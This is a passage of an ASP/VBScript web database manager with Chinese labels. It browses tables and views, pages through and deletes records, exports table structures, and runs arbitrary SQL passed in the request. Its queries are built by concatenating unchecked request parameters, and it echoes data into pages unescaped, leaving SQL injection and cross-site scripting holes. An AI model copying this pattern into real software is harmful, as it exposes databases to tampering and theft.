	echo "<input type=button value=添加 onclick=if(confirm('确实要添加当前为新记录吗?')){this.form.action.value='new';this.form.submit();};>&nbsp;"
	echo "<input type=button value=上一条 onclick=""this.form.action.value='pre';this.form.submit();"">&nbsp;"
	echo "<input type=button value=下一条 onclick=""this.form.action.value='next';this.form.submit();"">&nbsp;&nbsp;"
	echo "<a href='?key=view&table_name=" & names & "'>表结构</a>&nbsp;&nbsp;"
	echo "<a href='?key=sql&sql=select * from " & names & "&table_name="& names & "&primarykey="&keys&"'>表浏览</a>&nbsp;&nbsp;"
	echo "<a href='?'>主界面</a>&nbsp;&nbsp;"
	echo "</form></td></tr></table>"
end sub

'==================================================================显示存储过程
sub showproc()
	dim sTableName,adox
	on error resume next
	echo "存储过程：<font color=red>" & Request("table_name") & "<font><br>"
	sTableName = Request("table_name")
	Set adox = Server.CreateObject("ADOX.Catalog")
	adox.ActiveConnection = Conn
	echo "<textarea cols=70 rows=8>" & adox.Procedures(sTableName).Command.CommandText & "</textarea><br>"
	if err <> 0 then
		echo err.description
		exit sub
	end if
end sub


'==================================================================分页导航
'分页导航
sub showNavBar (rs,page,pageUrl,pageSize)
	page = cint(page)
	%>
	<table width="100%" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<tr>
	  <% if request("primarykey") <> "" and request("table_name") <> "" then %>
	  <td align="left">当前表：<font color=red><%=request("table_name")%></font>&nbsp;&nbsp;&nbsp;&nbsp;
	  <a href="?key=edit&table_name=<%=request("table_name")%>&primarykey=<%=request("primarykey")%>&action=add">插入新记录</a> 
	  </td>
	  <% end if %>
	  <td align="right">
		<%
		echo "共有" & rs.recordCount & "条纪录 当前" & page & "/" & rs.PageCount & "页"
	    if page > 1 then
			echo "<a href='" & pageUrl & "&page=1&pageSize="&pageSize&"'>首页</a> " 
			echo "<a href='" & pageUrl & "&page=" & page - 1 & "&pageSize="&pageSize&"'>上页</a> "
	    end if
		if (rs.PageCount > 1 and page < rs.PageCount) then
			echo "<a href='" & pageUrl & "&page=" & page + 1 & "&pageSize="&pageSize&"'>下页</a> "
			echo "<a href='" & pageUrl & "&page=" & rs.pageCount & "&pageSize="&pageSize&"'>末页</a> "
		end if
		echo "转到:第"
		echo "<select name='select2' onChange='location.href=this.value;'>"
		dim i
		for i = 1 to rs.PageCount
			echo "<option value='"& pageUrl &"&pageSize="&pageSize&"&page="& i & "' "
			if i = cint(page) then echo "selected"
			echo ">"& i &"</option>"
		next
		echo "</select>页"
	    %>
		</td>
	</tr>
	</table>
	<%
end sub


'==================================================================显示查询
sub showselect(sql)
	dim page,pageUrl,strdel,geturl					
	pageSize = request("pageSize") 			'设置每页显示的记录数
	if pageSize = "" or not isNumeric(pageSize) then pageSize = 50
	
	'判断是否删除
	if request("keylog") <> "" then
		strdel = "delete from " & request("table_name") & " where " & request("primarykey") & "=" & request("keylog")
		response.Write strdel
		conn.execute(strdel)
		geturl = "?" & replace(request.QueryString,"&keylog="&request("keylog"),"")
		response.Redirect geturl
	end if
	
	page = request("page")           '设置当前显示的页数
	if page="" or not isNumeric(page) then page=1
	pageUrl = "?key=sql&sql=" & sql
	if request("primarykey") <> "" and request("table_name") <> "" then
	  pageUrl = pageUrl & "&table_name=" & request("table_name") & "&primarykey=" & request("primarykey")
	end if
	
	'--------------------------
   dim rs
   set rs = Server.CreateObject("ADODB.Recordset")
   rs.Open sql,conn,3
   
   if not rs.eof then
   	  rs.pageSize = pageSize
	  if cint(page) < 1 then page = 1
   	  if cint(page) > rs.PageCount then page = rs.PageCount
   	  rs.absolutePage = page
   end if
	
	'显示分页导航
   showNavBar rs,page,pageUrl,pageSize
   
   '-------------------------------
   echo "<div style='overflow-x:auto;overflow-y:auto; width:800;height:380;'>"
   echo "<table border=0 border=0 cellpadding=3 cellspacing=1 bgcolor=#CCCCCC><tr>"
   primarykey = request("primarykey")
   if primarykey <> "" and request("table_name") <> "" then
   echo "<td bgcolor=#ffffff>操作</td><td bgcolor=#ffffff>删</td>"
   end if
   for i = 0 to rs.fields.count - 1         '循环字段名
      set field = rs.fields.item(i)
      echo "<td bgcolor=#ffffff>" & field.name & " </td>"
   next
   echo "</tr>"
   
   dim i,field,j
   do while not rs.eof and j < rs.pageSize                    '循环数据
      echo "<tr>"
	  
	  if primarykey <> "" and request("table_name") <> "" then
	  echo "<td bgcolor=#ffffff nowrap><a href='?key=edit&table_name=" & request("table_name") & "&primarykey=" & primarykey & "&primarykeyvalue=" & rs(primarykey) & "'><font color=#666666>编辑</font></a></td>"
	  echo "<td><a href='?"&Request.QueryString&"&keylog="&rs(primarykey)&"' onClick='return table_delete();'><font color=#FF000>×</font></a></td>"
	  end if
	  
      for i = 0 to rs.fields.count - 1
         set field = rs.fields.item(i)
		 if len(field.value) < 12 then
         	echo "<td bgcolor=#ffffff nowrap>" & field.value & " </td>"
		 else
		 	echo "<td bgcolor='#ffffff'><span class='fixspan'>" & field.value & " </span></td>"
		 end if
      next
      echo "</tr>"
      rs.MoveNext
      j = j + 1
   loop
   'response.ContentType ="application/vnd.ms-excel"'生成EXCEL表格
   echo "</table></div>"
   
end sub


sub exesql(sql)
	on error resume next
	'==================================================================执行sql函数
	
    if trim(request.form("SchemaTable")) <> "" then Call showSchema (adSchemaTables)
    if trim (request.form("SchemaColumn")) <> "" then Call showSchema(adSchemaColumns)
    if trim (request.form("SchemaProvider")) <> "" then Call showSchema(adSchemaProviderTypes)

	sql = trim(request("sql"))
	if sql = "" then exit sub
	
    sql = RegExpReplace(sql, "(--)(.)*\n", "")   '替换注释
    sql = RegExpReplace(sql, "\n[\s| ]*\r", "")  '替换空行
    sql = RegExpReplace(sql, "\n", "")           '替换换行符
    sql = RegExpReplace(sql, "\r", "")           '替换回车符
    if (LCase(left(sql,len("select"))) = "select") and instr(sql,"into") = 0 then
       Call showSelect (sql)
	   if err <> 0 then echo "<br><font color=red>" & err.description & "</font>"
       response.end
    else
   		'如果非select语句,允许执行多条以分号分隔的语句
   		dim aSql,iLoop
   		aSql = split(sql,";")
   		for iLoop = 0 to UBound(aSql)
			if trim(aSql(iLoop)) <> "" then
      	    	conn.execute (aSql(iLoop))
				if err <> 0 then
					echo "<br><font color=red>" & err.description & "<br>&nbsp;&nbsp;<b>"
					echo iLoop + 1 & "、</b></font><font color=#CC6600>" & aSql(iLoop) & "</font><br>"
					'err.clear()     '忽略错误
					exit sub          '中止执行
				else
					echo "<div style='padding:3px 0px;border-bottom:1px solid #069;'><b>" & iLoop + 1 & "、</b>" & aSql(iLoop) & "</div>"
				end if
			end if
        next
        echo "<font color=red><h4>命令执行成功</h4></font>"
   end if
end sub

'显示数据库信息
'QueryType有以下三个主要参数
'adSchemaTables
'adSchemaColumns
'adSchemaProviderTypes
'Call showSchema (adSchemaTables)
sub showSchema(QueryType)
dim rs
'set rs = conn.OpenSchema()
set rs = conn.OpenSchema (QueryType)
'set rs = conn.OpenSchema (adSchemaProviderTypes)

   echo "<div style='overflow-x:auto;overflow-y:auto; width:800;height:380;'><table border=0 border=0 cellpadding=3 cellspacing=1 bgcolor=#CCCCCC><tr>"
   for i = 0 to rs.fields.count - 1         '循环字段名
      set field = rs.fields.item(i)
      echo "<td bgcolor='#FFFFFF'>" & field.name & " </td>"
   next
   echo "</tr>"
   
   dim i,field
   do while not rs.eof                      '循环数据
      echo "<tr>"
      for i = 0 to rs.fields.count - 1
         set field = rs.fields.item(i)
         echo "<td bgcolor='#FFFFFF'>" & field.value & " &nbsp;</td>"
      next
      echo "</tr>"
      rs.MoveNext
   loop
   
   echo "</table></div>"
end sub   

%>



<%
'==================================================================导出SQL
sub tosql(strt)
	'strt = 0 导出结构
	'strt = 1 导出内容
	dim strsql
	if strt = "0"  then
		table = request("table_name")
		echo "以下是表 <font color=red>" & request("table_name") & "</font> 的结构: "
		echo "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
		strsql = getsql(table)
	end if
	if strt = "2" then
		echo "以下是 <font color=red> 数据库 </font> 的结构: "
		echo "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
		set objSchema = Conn.OpenSchema(adSchemaTables)
		Do While Not objSchema.EOF
			if objSchema("TABLE_TYPE") = "TABLE" then
				table = objSchema("TABLE_NAME")
				strsql = strsql & getsql(table)'table & "|"'getsql(table)
			end if
		objSchema.MoveNext
		Loop
		objSchema.close
	end if		
	echo "<textarea cols=110 rows=38>" & strsql & "</textarea>"
	conn.close
end sub

'================================================================== 输出表结构
function getsql(table)
	on error resume next
	getsql = "-- 表结构 " & table & " 的SQL语句。" & chr(10)
	dim primary,primarykey
	Set primary = Conn.OpenSchema(adSchemaPrimaryKeys,Array(empty,empty,table))
	if primary("COLUMN_NAME") <> "" then
		primarykey = primary("COLUMN_NAME")
	end if
	
	primary.Close
	set primary = nothing
	
	tbl_struct = "CREATE TABLE [" & table & "] ( " & chr(10)
	sql = "SELECT * FROM " & table
	Set rs = Conn.Execute(sql)
	if err = 0 then
		for i = 0 to rs.fields.count-1
		   tbl_struct = tbl_struct & "[" & rs(i).name & "] "
		   typs = typ(rs(i).type)
		   if typs = "VARCHAR" or typs = "BINARY" or typs = "CHAR" then
			 tbl_struct = tbl_struct & typs & "(" & rs(i).definedsize & ")"
		   else
			 tbl_struct = tbl_struct & typs & " "
		   end if
		   attrib = rs(i).attributes
		   if (attrib and adFldIsNullable) = 0 then
			 tbl_struct = tbl_struct&" NOT NULL"
		   end if
		   if rs(i).Properties("ISAUTOINCREMENT") = True then
			 tbl_struct = tbl_struct & " IDENTITY"
		   end if
		   tbl_struct = tbl_struct & "," & chr(10)
		next
		if primarykey <> "" then
			tbl_struct = tbl_struct & "PRIMARY KEY ([" & primarykey & "]));"
		else
			len_of_sql = Len(tbl_struct)
			tbl_struct = Mid(tbl_struct,1,len_of_sql-2)
			tbl_struct = tbl_struct & ");"
		end if
	else
		tbl_struct = "CREATE TABLE [" & table & "];"
	end if
	getsql = getsql & tbl_struct & chr(10) & chr(10)
end function

sub help()
	echo "SQL 常用语句：<br><br>"
	echo "创建表：<br>"
	echo "CREATE TABLE [表名] (<br>"
	echo "[test1] int not null identity,<br>"
	echo "[test2] binary not null,<br>"
	echo "primary key ([test1]))<br><br>"
	echo "设置主键：ALTER TABLE [tablename] ADD PRIMARY KEY ([fieldname])<br><br>"
	echo "查询：select * from tablename where fieldname *** order by id desc<br><br>"
	echo "更新：update tanlename set fieldname = values,cn_name='values' where ID = 1<br><br>"
	echo "添加：insert into tanlename (fieldnam,fieldnam2)values (1,'values')<br><br>"
	echo "删除：delete from tanlename where fieldname = values<br><br>"
	echo "删除表：DROP TABLE 数据表名称<br><br>"
	echo "添加字段：ALTER TABLE [表名] ADD [字段名] NVARCHAR (50) NULL<br><br>"
	echo "删除字段：alter table [tablename] drop [fieldname]<br><br>"
	echo "修改字段：ALTER TABLE [表名] ALTER COLUMN [字段名] 类型(大小) NULL<br><br>"
	echo "新建约束：ALTER TABLE [表名] ADD CONSTRAINT 约束名 CHECK ([约束字段] <= '2000-1-1')<br><br>"
	echo "删除约束：ALTER TABLE [表名] DROP CONSTRAINT 约束名<br><br>"
	echo "新建默认值：ALTER TABLE [表名] ADD CONSTRAINT 默认值名 DEFAULT '51WINDOWS.NET' FOR [字段名]<br><br>"
	echo "删除默认值：ALTER TABLE [表名] DROP CONSTRAINT 默认值名<br><br>"

end sub
%>


<!--程序界面主表格开始-->
<table width="100%" height="100%" border="0" cellpadding="5" cellspacing="1" bgcolor="#CCCCCC">
  <tr>
    <td width="18%" valign="top">

<div id="Layer1" style="overflow-x:auto;overflow-y:auto; width:100%;height:100%;">
<div style="width:140px;height:0px;overflow:hidden;"></div>
表：&nbsp;<a href="?">主界面</a>&nbsp;<a href="?key=exit">退出</a>&nbsp;<a href="?key=help">Help</a><br>

<%
set objSchema = Conn.OpenSchema(adSchemaTables)
Do While Not objSchema.EOF
	if objSchema("TABLE_TYPE") = "TABLE" then
	    '输出表名
        echo "<a href='?key=view&table_name="& objSchema("TABLE_NAME") &"'>" & objSchema("TABLE_NAME") & "</a><br>"
	end if
objSchema.MoveNext
Loop

echo "所有视图：<br>"
objSchema.MoveFirst
Do While Not objSchema.EOF
	if objSchema("TABLE_TYPE") = "VIEW" then
	    '输出表名
        echo "<a href='?key=sql&sql=SELECT * FROM [" & objSchema("TABLE_NAME")& "]'>" & objSchema("TABLE_NAME") & "</a><br>"
	end if
objSchema.MoveNext
Loop
objSchema.Close
set objSchema = nothing

'echo "存储过程：<br>"
'set objSchema = Conn.OpenSchema(adSchemaProcedures)
'Do While Not objSchema.EOF
'    echo "<a href='?key=proc&table_name="& objSchema("PROCEDURE_NAME") &"'>" & objSchema("PROCEDURE_NAME") & "</a><br>"
'objSchema.MoveNext
'Loop
'objSchema.Close
'set objSchema = nothing

%>
</div>
	</td>
    <td width="82%" valign="top">
<div id="Layer2" style="overflow-x:anto;overflow-y:auto; width:100%;height:100%;">
<%
select case request("key")
case "" '显示主界面
  call main("")
case "addtable" '显示创建表界面
  call add_table(request("table_name"),request("field_num"))
case "createtable" '执行创建表
  call create_table()
case "view"
  call view(request("table_name"))
case "sql"
  call main("1")
  call exesql(trim(request("sql")))
case "addfield"
  call addfield()
case "editfidlevi"
  call view(request("table_name"))
case "editfidle"
  call editfidle()
case "exit"
  session("dbtype") = ""
  session("dbstr") = ""
  session("db007pass") = ""
  response.redirect "?"
case "tosql"
  call tosql(request("strt"))
case "proc"
  call main("1")
  call showproc()
case "help"
  call help()
case "edit"
  call EditData()
case "reobj"
  call reobj()
end select
%>
</div>
	</td>
  </tr>
</table>
<!--程序界面主表格结束-->
</body>
</html>